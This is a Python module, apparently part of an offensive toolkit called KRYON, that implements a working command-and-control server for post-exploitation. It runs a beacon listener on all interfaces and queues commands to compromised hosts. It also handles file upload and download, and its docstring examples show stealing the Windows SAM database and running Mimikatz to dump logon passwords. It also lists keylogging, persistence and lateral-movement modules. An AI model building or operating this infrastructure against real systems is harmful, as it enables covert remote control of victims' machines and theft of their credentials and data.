"""
KRYON Command & Control - C2 Server Infrastructure

Multi-protocol C2 server for post-exploitation operations.

Clearance Level: Omega-Strike (Command & Control Authority)
Specialization: C2 infrastructure, beacon management, session handling
Mission: Maintain persistent command and control over compromised systems

This module provides:
- HTTP/HTTPS C2 server
- DNS C2 tunneling
- Beacon session management
- Command queuing and execution
- Encrypted communications
- Multi-session handling
"""

import base64
import http.server
import json
import socketserver
import ssl
import threading
from datetime import datetime
from typing import Any, Optional

# Global state for C2 server
_C2_STATE = {"running": False, "sessions": {}, "command_queue": {}, "listeners": []}


class C2HTTPHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for C2 communications."""

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Handle beacon check-in (GET request)."""
        global _C2_STATE

        # Extract beacon ID from path
        beacon_id = self.path.strip("/")

        if not beacon_id:
            self.send_response(404)
            self.end_headers()
            return

        # Register/update session
        if beacon_id not in _C2_STATE["sessions"]:
            _C2_STATE["sessions"][beacon_id] = {
                "id": beacon_id,
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "ip": self.client_address[0],
                "commands_executed": 0,
            }
        else:
            _C2_STATE["sessions"][beacon_id]["last_seen"] = datetime.now().isoformat()

        # Check for queued commands
        commands = _C2_STATE["command_queue"].get(beacon_id, [])

        if commands:
            # Send command to beacon
            command = commands.pop(0)
            response = base64.b64encode(command.encode()).decode()

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(response.encode())
        else:
            # No commands, send empty response
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"")

    def do_POST(self):
        """Handle beacon output (POST request)."""
        global _C2_STATE

        beacon_id = self.path.strip("/")

        # Read output
        content_length = int(self.headers["Content-Length"])
        output_data = self.rfile.read(content_length)

        # Decode output
        try:
            output = base64.b64decode(output_data).decode()

            # Store output
            if beacon_id in _C2_STATE["sessions"]:
                if "output" not in _C2_STATE["sessions"][beacon_id]:
                    _C2_STATE["sessions"][beacon_id]["output"] = []

                _C2_STATE["sessions"][beacon_id]["output"].append(
                    {"timestamp": datetime.now().isoformat(), "data": output}
                )

                _C2_STATE["sessions"][beacon_id]["commands_executed"] += 1

        except Exception:
            pass

        self.send_response(200)
        self.end_headers()


def create_c2_server(
    protocol: str = "http",
    host: str = "0.0.0.0",
    port: int = 8080,
    ssl_cert: Optional[str] = None,
    ssl_key: Optional[str] = None,
) -> dict[str, Any]:
    """
    Create and start C2 server.

    Protocols:
    - http: HTTP C2 server
    - https: HTTPS C2 server (requires SSL cert/key)
    - dns: DNS C2 tunneling

    Args:
        protocol: C2 protocol (http, https, dns)
        host: Bind address (0.0.0.0 for all interfaces)
        port: Listen port
        ssl_cert: SSL certificate path (for HTTPS)
        ssl_key: SSL key path (for HTTPS)

    Returns:
        C2 server status and configuration

    Example:
        >>> from kryon.tools.command_and_control import create_c2_server
        >>>
        >>> # Start HTTP C2 server
        >>> result = create_c2_server(
        ...     protocol="http",
        ...     host="0.0.0.0",
        ...     port=8080
        ... )
        >>>
        >>> print(f"C2 URL: {result['c2_url']}")
        >>> print(f"Sessions: {result['active_sessions']}")
        >>>
        >>> # Beacons connect to: http://your-ip:8080/<beacon-id>

    Beacon Communication:
        - GET /<beacon-id>: Beacon checks for commands
        - POST /<beacon-id>: Beacon sends command output

    Features:
        - Multi-session handling
        - Command queuing
        - Output collection
        - Session tracking
    """
    global _C2_STATE

    results = {
        "protocol": protocol,
        "host": host,
        "port": port,
        "c2_url": "",
        "running": False,
        "active_sessions": 0,
        "success": False,
        "error": None,
    }

    try:
        if protocol in ["http", "https"]:
            # Create HTTP/HTTPS server
            server = socketserver.TCPServer((host, port), C2HTTPHandler)

            if protocol == "https":
                if not ssl_cert or not ssl_key:
                    results["error"] = "HTTPS requires ssl_cert and ssl_key"
                    return results

                # Wrap with SSL
                # nosemgrep: ssl-wrap-socket-is-deprecated
                server.socket = ssl.wrap_socket(
                    server.socket, certfile=ssl_cert, keyfile=ssl_key, server_side=True
                )  # nosemgrep: ssl-wrap-socket-is-deprecated

            # Start server in background thread
            server_thread = threading.Thread(target=server.serve_forever, daemon=True)
            server_thread.start()

            _C2_STATE["running"] = True
            _C2_STATE["listeners"].append({"protocol": protocol, "host": host, "port": port, "server": server})

            results["c2_url"] = f"{protocol}://{host}:{port}"
            results["running"] = True
            results["success"] = True

        elif protocol == "dns":
            results["error"] = "DNS C2 requires custom DNS server implementation"

    except Exception as e:
        results["error"] = str(e)

    return results


def send_command(beacon_id: str, command: str) -> dict[str, Any]:
    """
    Queue command for beacon execution.

    Args:
        beacon_id: Target beacon ID
        command: Command to execute

    Returns:
        Command queuing status

    Example:
        >>> from kryon.tools.command_and_control import send_command
        >>>
        >>> # Send command to beacon
        >>> result = send_command(
        ...     beacon_id="beacon123",
        ...     command="whoami"
        ... )
        >>>
        >>> print(f"Command queued: {result['queued']}")
    """
    global _C2_STATE

    results = {
        "beacon_id": beacon_id,
        "command": command,
        "queued": False,
        "success": False,
        "error": None,
    }

    try:
        if beacon_id not in _C2_STATE["command_queue"]:
            _C2_STATE["command_queue"][beacon_id] = []

        _C2_STATE["command_queue"][beacon_id].append(command)

        results["queued"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def get_sessions() -> dict[str, Any]:
    """
    Get all active C2 sessions.

    Returns:
        List of active sessions

    Example:
        >>> from kryon.tools.command_and_control import get_sessions
        >>>
        >>> # List all sessions
        >>> result = get_sessions()
        >>>
        >>> for session in result['sessions']:
        ...     print(f"Beacon: {session['id']}")
        ...     print(f"IP: {session['ip']}")
        ...     print(f"Last seen: {session['last_seen']}")
    """
    global _C2_STATE

    results = {"sessions": [], "total": 0, "success": False, "error": None}

    try:
        results["sessions"] = list(_C2_STATE["sessions"].values())
        results["total"] = len(results["sessions"])
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def get_session_output(beacon_id: str, last_n: int = 10) -> dict[str, Any]:
    """
    Get command output from beacon session.

    Args:
        beacon_id: Beacon ID
        last_n: Number of recent outputs to retrieve

    Returns:
        Session output

    Example:
        >>> from kryon.tools.command_and_control import get_session_output
        >>>
        >>> # Get output from beacon
        >>> result = get_session_output(
        ...     beacon_id="beacon123",
        ...     last_n=5
        ... )
        >>>
        >>> for output in result['outputs']:
        ...     print(f"[{output['timestamp']}] {output['data']}")
    """
    global _C2_STATE

    results = {"beacon_id": beacon_id, "outputs": [], "success": False, "error": None}

    try:
        if beacon_id not in _C2_STATE["sessions"]:
            results["error"] = f"Session not found: {beacon_id}"
            return results

        session = _C2_STATE["sessions"][beacon_id]

        if "output" in session:
            results["outputs"] = session["output"][-last_n:]

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def kill_session(beacon_id: str) -> dict[str, Any]:
    """
    Terminate beacon session.

    Args:
        beacon_id: Beacon ID to kill

    Returns:
        Kill status

    Example:
        >>> from kryon.tools.command_and_control import kill_session
        >>>
        >>> # Kill beacon session
        >>> result = kill_session("beacon123")
    """
    global _C2_STATE

    results = {"beacon_id": beacon_id, "killed": False, "success": False, "error": None}

    try:
        # Send kill command
        send_command(beacon_id, "exit")

        # Remove from sessions
        if beacon_id in _C2_STATE["sessions"]:
            del _C2_STATE["sessions"][beacon_id]

        if beacon_id in _C2_STATE["command_queue"]:
            del _C2_STATE["command_queue"][beacon_id]

        results["killed"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def stop_c2_server() -> dict[str, Any]:
    """
    Stop all C2 servers.

    Returns:
        Stop status

    Example:
        >>> from kryon.tools.command_and_control import stop_c2_server
        >>>
        >>> # Stop C2 server
        >>> result = stop_c2_server()
    """
    global _C2_STATE

    results = {"stopped": False, "listeners_stopped": 0, "success": False, "error": None}

    try:
        for listener in _C2_STATE["listeners"]:
            try:
                listener["server"].shutdown()
                results["listeners_stopped"] += 1
            except Exception:
                pass

        _C2_STATE["running"] = False
        _C2_STATE["listeners"] = []

        results["stopped"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def interactive_shell(beacon_id: str) -> dict[str, Any]:
    """
    Start interactive shell with beacon.

    Args:
        beacon_id: Beacon ID

    Returns:
        Interactive shell session info

    Example:
        >>> from kryon.tools.command_and_control import interactive_shell
        >>>
        >>> # Start interactive shell
        >>> result = interactive_shell("beacon123")
        >>>
        >>> # Now use send_command() and get_session_output()
        >>> # to interact with the beacon
    """
    global _C2_STATE

    results = {"beacon_id": beacon_id, "interactive": False, "success": False, "error": None}

    try:
        if beacon_id not in _C2_STATE["sessions"]:
            results["error"] = f"Session not found: {beacon_id}"
            return results

        # Mark session as interactive
        _C2_STATE["sessions"][beacon_id]["interactive"] = True

        results["interactive"] = True
        results["success"] = True

        results["info"] = "Use send_command() and get_session_output() for interaction"

    except Exception as e:
        results["error"] = str(e)

    return results


def upload_file_to_beacon(beacon_id: str, local_file: str, remote_path: str) -> dict[str, Any]:
    """
    Upload file to compromised system via beacon.

    Args:
        beacon_id: Beacon ID
        local_file: Local file path
        remote_path: Remote destination path

    Returns:
        Upload status

    Example:
        >>> from kryon.tools.command_and_control import upload_file_to_beacon
        >>>
        >>> # Upload tool to target
        >>> result = upload_file_to_beacon(
        ...     beacon_id="beacon123",
        ...     local_file="/tmp/tool.exe",
        ...     remote_path="C:\\Windows\\Temp\\tool.exe"
        ... )
    """
    results = {
        "beacon_id": beacon_id,
        "local_file": local_file,
        "remote_path": remote_path,
        "uploaded": False,
        "success": False,
        "error": None,
    }

    try:
        import os

        if not os.path.exists(local_file):
            results["error"] = f"File not found: {local_file}"
            return results

        # Read file and encode
        with open(local_file, "rb") as f:
            file_data = f.read()

        encoded_data = base64.b64encode(file_data).decode()

        # Send upload command
        upload_cmd = f"upload:{remote_path}:{encoded_data}"

        send_result = send_command(beacon_id, upload_cmd)

        if send_result["success"]:
            results["uploaded"] = True
            results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def download_file_from_beacon(beacon_id: str, remote_file: str, local_path: str) -> dict[str, Any]:
    """
    Download file from compromised system via beacon.

    Args:
        beacon_id: Beacon ID
        remote_file: Remote file path
        local_path: Local destination path

    Returns:
        Download status

    Example:
        >>> from kryon.tools.command_and_control import download_file_from_beacon
        >>>
        >>> # Download SAM database
        >>> result = download_file_from_beacon(
        ...     beacon_id="beacon123",
        ...     remote_file="C:\\Windows\\System32\\config\\SAM",
        ...     local_path="/tmp/SAM"
        ... )
    """
    results = {
        "beacon_id": beacon_id,
        "remote_file": remote_file,
        "local_path": local_path,
        "downloaded": False,
        "success": False,
        "error": None,
    }

    try:
        # Send download command
        download_cmd = f"download:{remote_file}"

        send_result = send_command(beacon_id, download_cmd)

        if send_result["success"]:
            results["info"] = "Download command queued. Check session output for file data."
            results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def execute_module(beacon_id: str, module: str, args: Optional[dict[str, Any]] = None) -> dict[str, Any]:
    """
    Execute post-exploitation module on beacon.

    Modules:
    - mimikatz: Credential dumping
    - screenshot: Take screenshot
    - keylog: Start keylogger
    - persist: Install persistence
    - lateral: Lateral movement

    Args:
        beacon_id: Beacon ID
        module: Module name
        args: Module arguments

    Returns:
        Module execution status

    Example:
        >>> from kryon.tools.command_and_control import execute_module
        >>>
        >>> # Run Mimikatz
        >>> result = execute_module(
        ...     beacon_id="beacon123",
        ...     module="mimikatz",
        ...     args={"command": "sekurlsa::logonpasswords"}
        ... )
    """
    results = {
        "beacon_id": beacon_id,
        "module": module,
        "executed": False,
        "success": False,
        "error": None,
    }

    try:
        args = args or {}

        # Build module command
        module_cmd = f"module:{module}:{json.dumps(args)}"

        send_result = send_command(beacon_id, module_cmd)

        if send_result["success"]:
            results["executed"] = True
            results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
